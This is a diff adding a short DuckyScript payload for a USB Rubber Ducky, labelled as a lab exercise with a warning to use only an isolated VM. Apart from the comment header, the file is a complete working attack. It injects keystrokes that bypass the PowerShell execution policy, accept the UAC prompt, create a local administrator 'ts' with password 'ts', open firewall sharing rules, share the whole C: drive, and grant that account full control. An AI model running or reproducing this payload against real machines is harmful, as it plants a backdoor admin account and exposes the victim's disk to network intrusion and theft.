@@ -1,0 +1,20 @@
+REM ============================================================
+REM Lab 01: Rogue Admin Account + Open SMB Share
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM See DuckyLabs/README.md for ground rules.
+REM
+REM Effect: creates local user "ts" / password "ts", adds it to
+REM Administrators, enables the File and Printer Sharing firewall
+REM rule group, shares C:\ as \\<host>\ts with no size limit, and
+REM grants "ts" full control over the top-level contents of C:\.
+REM ============================================================
+
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -Exec Bypass "saps cmd '/C net User ts ts /ADD&net LocalGroup Administrators ts /ADD&netsh advfirewall firewall set rule group="""File and Printer Sharing""" new enable=Yes&net share ts=c:\ /UNLIMITED&icacls c:* /grant ts:(OI)(CI)F' -Verb RunAs"
+ENTER
+DELAY 1000
+ALT y
